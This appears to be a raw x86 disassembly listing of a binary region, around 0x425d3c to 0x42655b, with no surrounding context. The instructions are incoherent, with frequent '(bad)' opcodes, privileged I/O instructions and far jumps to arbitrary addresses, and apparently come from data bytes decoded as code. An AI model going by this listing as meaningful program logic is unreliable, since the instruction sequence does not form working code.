  425d3c:	aad    0xd6
  425d3e:	mov    cs,WORD PTR [esp+edx*1+0x69]
  425d42:	mov    al,ds:0x4568494d
  425d47:	cmp    al,0xe7
  425d49:	xchg   ebp,eax
  425d4a:	add    DWORD PTR [eax+0x0],0x4f12a535
  425d51:	mov    bl,0xea
  425d53:	cli    
  425d54:	out    dx,al
  425d55:	xchg   ebx,eax
  425d56:	dec    edi
  425d57:	fadd   DWORD PTR [edx+0x57]
  425d5a:	addr16 cmp ah,cl
  425d5d:	and    al,0x91
  425d5f:	and    DWORD PTR [esi+ebp*4+0x596fc6a7],ebx
  425d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d67:	dec    esi
  425d68:	adc    eax,0xca05c462
  425d6d:	std    
  425d6e:	test   DWORD PTR [edx],ebp
  425d70:	sbb    al,0xd3
  425d72:	push   0xffffffb7
  425d74:	sbb    BYTE PTR [eax+eiz*8],bh
  425d77:	jns    0x425d3a
  425d79:	lods   al,BYTE PTR ds:[esi]
  425d7a:	cmp    ecx,DWORD PTR [ebx]
  425d7c:	stos   BYTE PTR es:[edi],al
  425d7d:	and    ecx,DWORD PTR [ebx+ebx*1-0x57]
  425d81:	stc    
  425d82:	aas    
  425d83:	adc    BYTE PTR [eax+0x2432223a],0x64
  425d8a:	push   ds
  425d8b:	ins    BYTE PTR es:[edi],dx
  425d8c:	add    eax,0xec7af9ef
  425d91:	ja     0x425d50
  425d93:	mov    ah,0x7a
  425d95:	and    bh,ah
  425d97:	jp     0x425d3e
  425d99:	or     al,0x73
  425d9b:	inc    eax
  425d9c:	mov    ecx,0x6166c68e
  425da1:	adc    BYTE PTR [ebx-0x79a7b3f9],0x4f
  425da8:	dec    edx
  425da9:	mov    es,ecx
  425dab:	push   0x4ff697a6
  425db0:	mov    cl,0xa6
  425db2:	mov    eax,DWORD PTR [esi+0x42]
  425db5:	aaa    
  425db6:	jmp    0x991a3de3
  425dbb:	sbb    cl,BYTE PTR [ecx]
  425dbd:	fcomi  st,st(6)
  425dbf:	mov    al,ds:0xcc8f0082
  425dc4:	push   edi
  425dc5:	rol    BYTE PTR [ebp-0x4a96d769],0xe5
  425dcc:	mov    eax,0x502ddfa3
  425dd1:	retf   0x5653
  425dd4:	or     ch,bl
  425dd6:	or     esp,DWORD PTR [ebx]
  425dd8:	in     al,dx
  425dd9:	xchg   ebp,eax
  425dda:	ins    BYTE PTR es:[edi],dx
  425ddb:	or     BYTE PTR [eax],bl
  425ddd:	das    
  425dde:	pop    ebp
  425ddf:	xchg   ebx,eax
  425de0:	push   esp
  425de1:	cmp    al,0xbd
  425de3:	xor    eax,0x75ade9fd
  425de8:	es xchg esi,eax
  425dea:	test   al,0x4e
  425dec:	sti    
  425ded:	out    dx,eax
  425dee:	cmp    eax,0x94fe6a49
  425df3:	daa    
  425df4:	push   edx
  425df5:	push   ebp
  425df6:	fnstenv [ecx-0x72]
  425df9:	repnz aad 0x74
  425dfc:	sbb    al,0xd3
  425dfe:	push   ss
  425dff:	imul   ebp,DWORD PTR [ecx+0x79],0x57b106d3
  425e06:	push   0xffffffd7
  425e08:	jno    0x425df3
  425e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e0b:	inc    ebp
  425e0c:	lds    ebp,FWORD PTR ds:0xfc218edd
  425e12:	mov    ah,0x4e
  425e14:	pusha  
  425e15:	scas   eax,DWORD PTR es:[edi]
  425e16:	pusha  
  425e17:	and    ebx,ebx
  425e19:	std    
  425e1a:	adc    BYTE PTR [edx],bl
  425e1c:	push   cs
  425e1d:	push   ds
  425e1e:	aas    
  425e1f:	neg    DWORD PTR [esi+0x7]
  425e22:	mov    dh,0x45
  425e24:	dec    eax
  425e25:	mov    al,ds:0xfd0ee5c7
  425e2a:	mov    ecx,gs
  425e2c:	mov    cl,0xe6
  425e2e:	sar    DWORD PTR [ebx+0x13],cl
  425e31:	imul   ecx,esi,0x8677a73e
  425e37:	inc    esi
  425e38:	imul   edi,DWORD PTR [esi+0x29f7337a],0xbf903d7f
  425e42:	add    eax,0x6f1578a7
  425e47:	push   ecx
  425e48:	adc    al,BYTE PTR [edx-0x5be606aa]
  425e4e:	fmul   st,st(5)
  425e50:	dec    edi
  425e51:	jae    0x425e91
  425e53:	push   edi
  425e54:	xchg   esp,eax
  425e55:	mov    ecx,0xb5b028ef
  425e5a:	mov    eax,0x1f4e46f7
  425e5f:	(bad)  
  425e60:	jne    0x425e1a
  425e62:	cmp    BYTE PTR [ebp-0x8],0xc3
  425e66:	dec    esp
  425e67:	lods   eax,DWORD PTR ds:[esi]
  425e68:	ins    BYTE PTR es:[edi],dx
  425e69:	jo     0x425e9c
  425e6b:	int    0xd1
  425e6d:	nop
  425e6e:	nop
  425e6f:	jno    0x425ebe
  425e71:	std    
  425e72:	mov    cl,0x59
  425e74:	cmp    al,0x76
  425e76:	stos   DWORD PTR es:[edi],eax
  425e77:	push   cs
  425e78:	scas   al,BYTE PTR es:[edi]
  425e79:	rcr    BYTE PTR [esi+ebp*2+0x66],1
  425e7d:	icebp  
  425e7e:	mov    edi,0xf24146a5
  425e83:	mov    ch,0xbb
  425e85:	add    DWORD PTR [ecx-0x673d6737],ebp
  425e8b:	adc    BYTE PTR [esi-0x99b8433],bh
  425e91:	xchg   BYTE PTR [esi+ebp*8],dl
  425e94:	icebp  
  425e95:	sub    eax,0xee557b6e
  425e9a:	call   0xae5d:0x486744af
  425ea1:	aam    0x41
  425ea3:	mov    DWORD PTR [edx],esi
  425ea5:	xor    BYTE PTR [ebx-0x2efb8519],0xdc
  425eac:	les    edi,FWORD PTR [esi-0x17]
  425eaf:	sbb    al,0xe4
  425eb1:	sbb    DWORD PTR [ecx],ebx
  425eb3:	addr16 retf 0xcaf0
  425eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425eb8:	or     BYTE PTR [eax],dh
  425eba:	ret    0x2369
  425ebd:	lar    esi,WORD PTR [edi+0x8]
  425ec1:	and    al,0x7a
  425ec3:	jnp    0x425e50
  425ec5:	mov    al,ds:0x857a9b54
  425eca:	push   edx
  425ecb:	retf   
  425ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ecd:	cwde   
  425ece:	pop    ebx
  425ecf:	sbb    esi,DWORD PTR [eax-0x3e]
  425ed2:	je     0x425f0d
  425ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ed5:	in     al,dx
  425ed6:	pop    edx
  425ed7:	add    bh,ah
  425ed9:	gs mov edx,0xe9df1fe5
  425edf:	std    
  425ee0:	shl    DWORD PTR [edx-0x53b3aea4],1
  425ee6:	jnp    0x425ee4
  425ee8:	sub    al,0xbe
  425eea:	xchg   ebx,eax
  425eeb:	loop   0x425f62
  425eed:	pop    ebp
  425eee:	xchg   ebx,eax
  425ef0:	sub    esp,DWORD PTR [ebx-0x5cf586f1]
  425ef6:	(bad)  
  425ef9:	pop    edi
  425efa:	and    al,0x34
  425efc:	shl    ch,1
  425efe:	pop    ds
  425eff:	repz adc BYTE PTR [esi-0x4e],al
  425f03:	imul   esi,DWORD PTR es:[edx+0x3e61f58f],0x1bc52c8
  425f0e:	cmp    BYTE PTR [ebx+eiz*2-0x34],0xf7
  425f13:	jge    0x425f46
  425f15:	icebp  
  425f16:	mov    ch,0x7b
  425f18:	fadd   QWORD PTR [ebx-0x1b]
  425f1b:	push   ebp
  425f1c:	sub    al,0x8b
  425f1e:	or     ch,BYTE PTR ds:0x4aa3315e
  425f24:	xor    al,cl
  425f26:	outs   dx,DWORD PTR ds:[esi]
  425f27:	adc    BYTE PTR [ebx-0x4],0xf4
  425f2b:	add    al,BYTE PTR [ebx+0x2e]
	...
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    ebp,DWORD PTR [esi+0x18]
  425f48:	ds cld 
  425f4a:	pusha  
  425f4b:	(bad)  
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	cld    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [ecx+0x3f],dh
  425f54:	int3   
  425f55:	int3   
  425f56:	retf   0x6821
  425f59:	fisubr DWORD PTR ds:0x293d3d36
  425f5f:	repnz cdq 
  425f61:	(bad)  
  425f62:	clc    
  425f63:	sub    DWORD PTR [ebx],ebx
  425f65:	mov    ?,esp
  425f67:	xor    DWORD PTR [ebx-0x6ce370b6],0x6c3a8c65
  425f71:	rol    BYTE PTR [ebp+esi*8-0x4232b12b],1
  425f78:	mov    dl,0x2d
  425f7a:	xchg   ecx,eax
  425f7b:	cmp    WORD PTR [ebp+0x6a52a261],si
  425f82:	mov    bl,0x6a
  425f84:	jno    0x425f22
  425f86:	and    al,0x41
  425f88:	push   edx
  425f89:	jnp    0x425fc9
  425f8b:	cdq    
  425f8c:	jecxz  0x425fe5
  425f8e:	ss loopne 0x425ff1
  425f91:	push   edx
  425f92:	xchg   cl,ah
  425f94:	cld    
  425f95:	or     eax,0xec5689fe
  425f9a:	call   0xff52:0x796cde91
  425fa1:	add    BYTE PTR [edi-0x589ea81],al
  425fa7:	scas   eax,DWORD PTR es:[edi]
  425fa8:	sbb    BYTE PTR [edx],ah
  425faa:	sub    bh,BYTE PTR [edx+0x55]
  425fad:	inc    BYTE PTR [ebp+0x638cd958]
  425fb3:	xchg   BYTE PTR [esi+0x925f965],dl
  425fb9:	push   ds
  425fba:	mov    ds:0x238dcf6c,al
  425fbf:	push   ebx
  425fc0:	dec    ebp
  425fc1:	add    bl,BYTE PTR [ecx+ecx*4-0x47]
  425fc5:	nop
  425fc6:	in     al,dx
  425fc7:	add    al,0x2
  425fc9:	lds    esi,FWORD PTR [esi-0x6755401c]
  425fcf:	dec    ebx
  425fd0:	pop    eax
  425fd1:	sub    esp,DWORD PTR [ecx+0x7979cd34]
  425fd7:	ins    BYTE PTR es:[edi],dx
  425fd8:	or     BYTE PTR [edi+edx*2+0xe79de7b],ah
  425fdf:	lds    esp,FWORD PTR fs:[edi]
  425fe2:	xchg   ebp,eax
  425fe3:	jmp    0x57cf776d
  425fe8:	push   ebx
  425fe9:	rol    DWORD PTR [ebp+0x22ce556a],cl
  425fef:	xchg   ebx,eax
  425ff0:	shl    DWORD PTR [edi+0x5eef49eb],0x4a
  425ff7:	mov    al,0x16
  425ff9:	sbb    ecx,esi
  425ffb:	pushf  
  425ffc:	aas    
  425ffd:	sbb    eax,0xf9ee416f
  426002:	(bad)  
  426003:	cmp    al,0x74
  426005:	loope  0x425ff7
  426007:	sub    eax,0x9b13f64
  42600c:	sbb    al,0x0
  42600e:	test   al,0xf3
  426010:	(bad)  
  426011:	dec    ebp
  426012:	inc    ecx
  426013:	call   0x52801afc
  426018:	jo     0x425fae
  42601a:	push   esp
  42601b:	pusha  
  42601c:	mov    dh,0xb4
  42601e:	ret    
  42601f:	pop    es
  426020:	add    cl,cl
  426022:	in     al,dx
  426023:	int3   
  426024:	mov    eax,ds:0xd341c661
  426029:	jno    0x425fb4
  42602b:	sbb    eax,0xe7604b75
  426030:	cdq    
  426031:	lahf   
  426032:	fldcw  WORD PTR [edx-0x57220fd7]
  426038:	xchg   edx,eax
  426039:	add    esp,edi
  42603b:	sbb    eax,0xfdbbcb57
  426040:	pushf  
  426041:	leave  
  426042:	ins    DWORD PTR es:[edi],dx
  426043:	cmp    cl,dl
  426045:	aas    
  426046:	pop    eax
  426047:	push   ebx
  426048:	aam    0xd3
  42604a:	cmp    ah,bh
  42604c:	jmp    0xa099:0xb2544f7a
  426053:	aad    0x16
  426055:	inc    edx
  426056:	in     eax,0xb6
  426058:	mov    ebx,0x7de8683a
  42605d:	mov    DWORD PTR [edi],eax
  42605f:	jbe    0x42602a
  426061:	mov    gs,WORD PTR [ebx-0x6d4ace2d]
  426067:	mov    BYTE PTR [edx],bl
  426069:	jo     0x42603d
  42606b:	cs js  0x4260e2
  42606e:	test   DWORD PTR [eax+0x7725e490],ebp
  426074:	(bad)  
  426075:	fcom   QWORD PTR [ecx-0x19]
  426078:	adc    ebp,DWORD PTR [edi-0x15]
  42607b:	inc    edi
  42607c:	mov    dh,0xd9
  42607e:	xchg   esi,eax
  42607f:	mov    ?,WORD PTR [ebp+0x18]
  426082:	mov    WORD PTR [eax-0x2f3a2dd9],ds
  426088:	int3   
  426089:	out    dx,eax
  42608a:	pop    ecx
  42608b:	imul   ebp,DWORD PTR gs:[edx],0xd6095a9f
  426092:	imul   DWORD PTR [ecx-0x32]
  426095:	dec    ecx
  426096:	fld    QWORD PTR [ebx]
  426098:	push   eax
  426099:	mov    esi,0x255547d1
  42609e:	dec    ecx
  42609f:	in     al,0x60
  4260a1:	dec    edi
  4260a2:	and    BYTE PTR [ebp+0x5988868d],0x84
  4260a9:	sbb    BYTE PTR [ebx-0x18],dl
  4260ac:	or     eax,0x7bdb700
  4260b1:	lods   al,BYTE PTR ds:[esi]
  4260b2:	and    eax,0x82a91314
  4260b7:	outs   dx,BYTE PTR ds:[esi]
  4260b8:	cwde   
  4260b9:	mov    esi,0xfe9bc0a9
  4260be:	adc    bh,dl
  4260c0:	in     al,dx
  4260c1:	cmc    
  4260c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260c3:	jbe    0x42612c
  4260c5:	mov    esp,0xc8452996
  4260ca:	aaa    
  4260cb:	daa    
  4260cc:	jne    0x4260cb
  4260ce:	pop    ss
  4260cf:	out    dx,al
  4260d0:	popf   
  4260d1:	xor    al,0x53
  4260d3:	inc    esi
  4260d4:	addr16 leave 
  4260d6:	add    edx,ecx
  4260d8:	scas   eax,DWORD PTR es:[edi]
  4260d9:	jp     0x426129
  4260db:	ins    DWORD PTR es:[edi],dx
  4260dc:	sbb    edx,DWORD PTR [ebp+0x834f13f]
  4260e2:	into   
  4260e3:	cli    
  4260e4:	pop    edx
  4260e5:	cmp    eax,0x3e789965
  4260ea:	rol    BYTE PTR [esi-0x22],0xc7
  4260ee:	mov    dh,0xa4
  4260f0:	jle    0x42610b
  4260f2:	mov    dl,0x17
  4260f4:	jmp    ecx
  4260f6:	or     DWORD PTR [edi-0x77],esi
  4260f9:	lahf   
  4260fa:	adc    DWORD PTR [edx+0x136c99c7],ebp
  426100:	xchg   esp,eax
  426101:	aad    0xe1
  426103:	adc    al,0x70
  426106:	pop    esp
  426107:	imul   BYTE PTR ds:0xd0b19e26
  42610d:	or     DWORD PTR [edi],0xffffff9f
  426110:	adc    DWORD PTR [edi+0xc6a5f31],ebx
  426116:	mov    ds:0xdb042709,al
  42611b:	and    BYTE PTR [eax],dl
  42611d:	test   eax,0x76300deb
  426122:	shr    DWORD PTR [ebx+eiz*2],cl
  426125:	fs pop edx
  426127:	xchg   ebx,eax
  426128:	add    eax,0xa46a314d
  42612d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42612e:	sub    eax,0x56e5dfcb
  426133:	fstp   DWORD PTR [esi-0x5c31beda]
  426139:	retf   0x8e46
  42613c:	and    DWORD PTR [edi+0x8],ebx
  42613f:	xor    bh,bl
  426141:	dec    ecx
  426142:	dec    ebx
  426143:	(bad)  
  426144:	ja     0x4260ce
  426146:	in     al,dx
  426147:	adc    esp,ebp
  426149:	loopne 0x426129
  42614b:	pop    eax
  42614c:	jno    0x426159
	...
  42615a:	ret    
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	add    ah,al
  426168:	mov    ebx,0x1d85cfb
  42616d:	add    ah,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [edx+edi*8],bh
  426174:	xchg   ebx,eax
  426175:	imul   DWORD PTR [edi+0x9]
  426178:	mov    dl,0xac
  42617a:	(bad)  
  42617b:	out    0x11,al
  42617d:	and    BYTE PTR [ebx],bl
  42617f:	hlt    
  426180:	ins    DWORD PTR es:[edi],dx
  426181:	jo     0x4261d9
  426183:	retw   
  426185:	std    
  426186:	out    0x71,eax
  426188:	jp     0x42617c
  42618a:	inc    esi
  42618b:	xor    esi,eax
  42618d:	lock sahf 
  42618f:	mov    esp,0x538a9da
  426194:	clc    
  426195:	mov    bh,0xd
  426197:	pop    ebx
  426198:	neg    DWORD PTR [ecx]
  42619a:	xchg   esp,eax
  42619b:	mov    esi,0x711d66a4
  4261a0:	push   edi
  4261a1:	jnp    0x426222
  4261a3:	shr    BYTE PTR [eax+0xc3fbd17],1
  4261a9:	mov    al,0xed
  4261ab:	sbb    bh,BYTE PTR [ecx]
  4261ad:	ins    DWORD PTR es:[edi],dx
  4261ae:	test   eax,0x739714dc
  4261b3:	mov    cl,BYTE PTR [esi+0x7a735a43]
  4261b9:	imul   esp,DWORD PTR [ebx+0x3a070e53],0x40217d7a
  4261c3:	or     BYTE PTR [ebx+0xc7a794e],bl
  4261c9:	dec    eax
  4261ca:	mov    bl,0xa7
  4261cc:	dec    ecx
  4261cd:	out    dx,al
  4261ce:	sar    BYTE PTR [ebp+0x7623da2c],1
  4261d4:	xor    eax,0x8c4cae1a
  4261d9:	pop    edi
  4261da:	mov    dl,0x41
  4261dc:	add    ecx,edx
  4261de:	dec    BYTE PTR ds:[ebp+0x4]
  4261e2:	jb     0x4261bf
  4261e4:	add    eax,0x578ec525
  4261e9:	or     DWORD PTR [edi-0x1e843356],edi
  4261ef:	lea    esi,[edi-0xc]
  4261f2:	sub    cl,BYTE PTR [ecx-0x73d9c666]
  4261f8:	mov    ds:0x84113e6e,al
  4261fd:	add    dl,BYTE PTR [eax]
  4261ff:	and    eax,0x9c2cfc92
  426204:	jne    0x426265
  426206:	dec    esi
  426207:	nop
  426208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426209:	jno    0x4261cd
  42620b:	idiv   DWORD PTR [edx-0x5fea1985]
  426211:	add    eax,eax
  426213:	fstp   TBYTE PTR [edx+0x5d35e1c]
  426219:	mov    al,0x9a
  42621b:	test   ebx,edi
  42621d:	sub    al,0xd4
  42621f:	pop    ds
  426220:	loop   0x42622c
  426222:	es inc ecx
  426224:	push   esi
  426225:	sbb    eax,0x296d39a5
  42622a:	jnp    0x4261c6
  42622c:	cmp    ch,BYTE PTR [ebp+0x1cd893d2]
  426232:	pop    es
  426233:	xchg   edx,eax
  426234:	adc    al,0xba
  426236:	pop    ebx
  426237:	loopne 0x4261da
  426239:	xchg   BYTE PTR [edi+0x25e37daf],ah
  42623f:	pop    ecx
  426241:	add    al,0x3e
  426243:	pop    es
  426244:	call   0xac2a1150
  426249:	mov    esp,0x1c347407
  42624e:	imul   eax,edx,0x38c63b7d
  426254:	push   ecx
  426255:	sbb    bl,BYTE PTR ds:0x132082d
  42625b:	sar    DWORD PTR [ecx+0x60],1
  42625e:	push   es
  42625f:	mov    al,0xe4
  426261:	mov    bl,0xab
  426263:	fwait
  426264:	sbb    BYTE PTR [edx+0x7e],ch
  426267:	jg     0x4262e0
  426269:	inc    ebp
  42626a:	pop    esp
  42626b:	mov    ah,ch
  42626d:	xchg   esi,ecx
  42626f:	shr    DWORD PTR [esi+0x34],0x36
  426273:	pop    edi
  426274:	add    al,0xbc
  426276:	xor    al,0x2d
  426278:	pop    eax
  426279:	fidiv  DWORD PTR [edi]
  42627b:	lea    eax,[esi-0x44]
  42627e:	dec    esi
  42627f:	dec    eax
  426280:	test   BYTE PTR [ebx+0x4cc4a811],ah
  426286:	fcmove st,st(1)
  426288:	or     bh,BYTE PTR [edi]
  42628a:	jne    0x42627a
  42628c:	out    0x99,eax
  42628e:	mov    esp,0xef1cb03d
  426293:	or     BYTE PTR [eax],0xad
  426296:	mov    al,0xcb
  426298:	inc    esp
  426299:	sub    bl,BYTE PTR [ebx+edi*1-0x5995c5fb]
  4262a0:	mov    ebp,0x24f5faa1
  4262a5:	sbb    bh,bh
  4262a7:	jl     0x4262de
  4262a9:	(bad)  
  4262aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ab:	rcl    BYTE PTR cs:[edi-0x58],0x71
  4262b0:	(bad)  
  4262b1:	dec    eax
  4262b2:	scas   al,BYTE PTR es:[edi]
  4262b3:	cmp    BYTE PTR [ecx],0x74
  4262b6:	repnz pop ebx
  4262b8:	iret   
  4262b9:	aam    0xed
  4262bb:	pushf  
  4262bc:	or     DWORD PTR [edi-0x39d07a61],ecx
  4262c2:	pushf  
  4262c3:	adc    ch,BYTE PTR [ecx+0x56]
  4262c6:	mov    eax,ds:0xc4db2fcf
  4262cb:	fsub   st,st(7)
  4262cd:	mov    eax,ds:0xafe88b2a
  4262d2:	dec    ebp
  4262d3:	imul   eax,edi,0x43d565aa
  4262d9:	push   ecx
  4262da:	iret   
  4262db:	and    bl,BYTE PTR [edx]
  4262dd:	jne    0x42632d
  4262df:	pop    ebx
  4262e0:	push   edx
  4262e1:	jp     0x426353
  4262e3:	nop
  4262e4:	popf   
  4262e5:	out    0xbb,eax
  4262e7:	and    BYTE PTR [ecx+esi*8-0x77],bl
  4262eb:	leave  
  4262ec:	imul   eax,DWORD PTR [ecx-0x5],0xb34f8f63
  4262f3:	popa   
  4262f4:	minps  xmm3,XMMWORD PTR [eax-0x7c]
  4262f8:	push   0x70
  4262fa:	and    BYTE PTR es:[ecx+0x5fbb6c48],dl
  426301:	int3   
  426302:	or     esi,eax
  426304:	shl    BYTE PTR [edx-0x79],cl
  426307:	out    dx,eax
  426308:	scas   eax,DWORD PTR es:[edi]
  426309:	adc    eax,0xb4b777df
  42630e:	mov    eax,DWORD PTR [ebx]
  426310:	mov    ch,BYTE PTR [edi]
  426312:	out    0x15,al
  426314:	lea    eax,ss:[edx]
  426317:	cdq    
  426318:	shl    ecx,1
  42631a:	imul   edi,ebx,0xffffffbc
  42631d:	lods   al,BYTE PTR ds:[esi]
  42631e:	ret    
  42631f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426320:	push   edx
  426321:	xor    DWORD PTR [edx],edx
  426323:	sbb    bl,BYTE PTR [esi+0x5fed0453]
  426329:	mov    ebp,0x2ead0c34
  42632e:	adc    DWORD PTR [edi],ecx
  426330:	sti    
  426331:	pusha  
  426332:	or     eax,0x7f1869d
  426337:	or     eax,0xd3999505
  42633c:	mov    ds:0x86ee2979,al
  426341:	add    DWORD PTR [ecx-0x511cb8bc],ecx
  426347:	inc    edx
  426348:	jl     0x4263b6
  42634a:	xchg   edi,eax
  42634b:	gs cmc 
  42634d:	push   ebx
  42634e:	xchg   esp,eax
  42634f:	(bad)  
  426350:	out    0xa3,eax
  426352:	sbb    dl,bh
  426354:	int3   
  426355:	push   edx
  426356:	(bad)  
  426357:	jb     0x426317
  426359:	xchg   edx,eax
  42635a:	int    0xcb
  42635c:	js     0x426328
  42635e:	sti    
  42635f:	bound  ebp,QWORD PTR [esi-0x46060bf1]
  426365:	ss fs gs nop
  426369:	icebp  
  42636a:	sub    al,0x7
  42636c:	lods   eax,DWORD PTR ds:[esi]
  42636d:	push   ecx
	...
  42637a:	call   0x9eff:0xefe9ef59
  426381:	jnp    0x42638f
  426383:	push   esi
  426384:	mov    ss,ebx
  426386:	lock inc edi
  426388:	je     0x4263f7
  42638a:	pop    eax
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ah,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [edi],al
  426393:	pop    ebp
  426394:	mov    edi,0xa8fb9d1
  426399:	mov    dh,0x93
  42639b:	push   ss
  42639c:	dec    ebp
  42639d:	xor    eax,0x45f595ec
  4263a2:	les    edx,FWORD PTR [ebx+ecx*8]
  4263a5:	js     0x4263f0
  4263a7:	xchg   BYTE PTR [edi-0x214384b3],bl
  4263ad:	push   edi
  4263ae:	(bad)  
  4263b0:	add    al,0x37
  4263b2:	and    ecx,DWORD PTR [edx+0x21]
  4263b5:	fdiv   st,st(5)
  4263b7:	jb     0x426369
  4263b9:	jo     0x42638b
  4263bb:	cmp    bh,ch
  4263bd:	and    BYTE PTR gs:[ecx-0x56ec835a],bl
  4263c4:	pop    edx
  4263c5:	xor    dl,BYTE PTR cs:[eax-0x6c32a8a2]
  4263cc:	cld    
  4263cd:	add    BYTE PTR [eax-0x14],ah
  4263d0:	enter  0x3593,0x57
  4263d4:	pushf  
  4263d5:	mov    al,0xcd
  4263d7:	cmp    al,0xb6
  4263d9:	cwde   
  4263da:	lods   al,BYTE PTR ds:[esi]
  4263db:	sbb    ebp,0x7e
  4263de:	dec    esi
  4263df:	add    BYTE PTR [ecx-0x589de5d3],dh
  4263e5:	mov    esi,0xd435c4e1
  4263ea:	jmp    0x632db544
  4263ef:	mov    al,0x3c
  4263f1:	fst    DWORD PTR [edx+0x21]
  4263f4:	div    ecx
  4263f6:	push   ecx
  4263f7:	add    DWORD PTR [edx],esp
  4263f9:	stc    
  4263fa:	lea    edx,[edi+edi*4-0x17dbb1e2]
  426401:	xchg   ebp,eax
  426402:	pop    ds
  426403:	xchg   edx,eax
  426404:	dec    esp
  426405:	inc    eax
  426406:	or     ebp,DWORD PTR [esi+eiz*8-0x4ae3b959]
  42640d:	pop    edx
  42640e:	pop    edi
  42640f:	add    eax,0x30c22f45
  426414:	test   al,0xc7
  426416:	ret    
  426417:	and    al,cl
  426419:	in     eax,dx
  42641a:	call   0xc2ef7cf0
  42641f:	or     DWORD PTR [ecx-0x64931fa0],edx
  426425:	ror    cl,0x3a
  426428:	sbb    ecx,DWORD PTR [ebx+0x65dbca94]
  42642e:	sbb    esi,DWORD PTR [edx-0x4c9da3ca]
  426434:	pop    esp
  426435:	retf   0x6858
  426438:	adc    dh,BYTE PTR [edx+0x70]
  42643b:	inc    esp
  42643c:	mov    al,ds:0x56e4c6b1
  426441:	push   ebp
  426442:	mov    ebx,0x94785354
  426447:	jae    0x426473
  426449:	repz mov ch,BYTE PTR [ecx]
  42644c:	push   ss
  42644d:	fcom   DWORD PTR [ebx-0x2c0f753b]
  426453:	inc    ecx
  426454:	clc    
  426455:	and    eax,0x611515c7
  42645a:	sbb    BYTE PTR [esp+edi*4],ch
  42645d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42645e:	sub    eax,0x7e1d77bc
  426463:	aas    
  426464:	sbb    BYTE PTR [ecx-0x287c2583],ch
  42646a:	push   ecx
  42646b:	(bad)  
  42646c:	out    0x9,eax
  42646e:	or     eax,DWORD PTR [edi]
  426470:	imul   esp,ecx,0x53
  426473:	mov    ds:0xcfecc4da,eax
  426478:	cld    
  426479:	mul    bl
  42647b:	dec    DWORD PTR [ebx-0x6a97c91a]
  426481:	push   eax
  426482:	push   eax
  426483:	in     al,0xc4
  426485:	fistp  WORD PTR [ecx+0x7d]
  426488:	adc    DWORD PTR [edi+0x4a],esp
  42648b:	add    eax,0x20176c20
  426490:	inc    ecx
  426491:	xor    BYTE PTR [eax],0xb2
  426494:	adc    eax,0x15511937
  426499:	and    DWORD PTR [esi],esp
  42649b:	push   edx
  42649c:	mov    eax,0x1200a8de
  4264a1:	jb     0x426452
  4264a3:	or     dl,BYTE PTR [ebx]
  4264a5:	(bad)  
  4264a6:	mov    edx,0x2f766d20
  4264ab:	shl    DWORD PTR [ebx+0x731de1cc],1
  4264b1:	jl     0x426519
  4264b3:	and    edi,DWORD PTR [edx-0x5d]
  4264b6:	pop    ebp
  4264b7:	cld    
  4264b8:	mov    ecx,edi
  4264ba:	and    DWORD PTR [esi+0x3f],0x7f
  4264be:	dec    esi
  4264bf:	jmp    0x2bab40e9
  4264c4:	inc    edi
  4264c5:	int    0xb1
  4264c7:	js     0x4264b3
  4264c9:	scas   eax,DWORD PTR es:[edi]
  4264ca:	icebp  
  4264cb:	xlat   BYTE PTR ds:[ebx]
  4264cc:	ja     0x4264b1
  4264ce:	cmp    DWORD PTR [edi+0x4e],edx
  4264d1:	lahf   
  4264d2:	test   BYTE PTR [ecx+0x56],cl
  4264d5:	and    eax,0x6a6383ed
  4264da:	clc    
  4264db:	add    al,0xd9
  4264dd:	clc    
  4264de:	jle    0x4264af
  4264e0:	jb     0x42652a
  4264e2:	das    
  4264e3:	mov    dh,0x42
  4264e5:	js     0x42653b
  4264e7:	loopne 0x426553
  4264e9:	loope  0x426543
  4264eb:	loopne 0x4264a6
  4264ed:	jge    0x4264ce
  4264ef:	mov    ecx,0xc7d9ff5b
  4264f4:	dec    esp
  4264f5:	or     dh,BYTE PTR [edi+0x5df0987a]
  4264fb:	xchg   esp,eax
  4264fc:	int    0x13
  4264fe:	test   eax,0x9c0cc2c8
  426503:	hlt    
  426504:	(bad)  
  426505:	leave  
  426506:	in     al,dx
  426507:	mov    esp,ecx
  426509:	mov    cl,0xb9
  42650b:	add    eax,0x1e48cdeb
  426510:	cmp    al,0x92
  426512:	shl    BYTE PTR [ebp+ebp*8+0x6e],0x14
  426517:	jno    0x42654a
  426519:	jne    0x42652b
  42651b:	jle    0x4264b2
  42651d:	leave  
  42651e:	xlat   BYTE PTR ds:[ebx]
  42651f:	out    dx,eax
  426520:	xor    eax,0x6337bebe
  426525:	mov    ecx,0x376272ba
  42652a:	(bad)  
  42652b:	fcom   DWORD PTR [ebx+0x2119d878]
  426531:	icebp  
  426532:	and    BYTE PTR [ebx],al
  426534:	sub    al,0xb3
  426536:	pop    edi
  426537:	push   ebp
  426538:	dec    edx
  426539:	sbb    edi,DWORD PTR [edi]
  42653b:	xor    eax,DWORD PTR [esi-0x7fce84d9]
  426541:	lea    ecx,[ebx]
  426543:	repz adc DWORD PTR [ebx-0x1f0ac621],edi
  42654a:	jg     0x426530
  42654c:	xchg   ecx,eax
  42654d:	push   0xc81af420
  426552:	shufps xmm6,XMMWORD PTR [eax+eiz*8+0x1c],0xc7
  426558:	hlt    
  426559:	je     0x426559
  42655b:	iret   
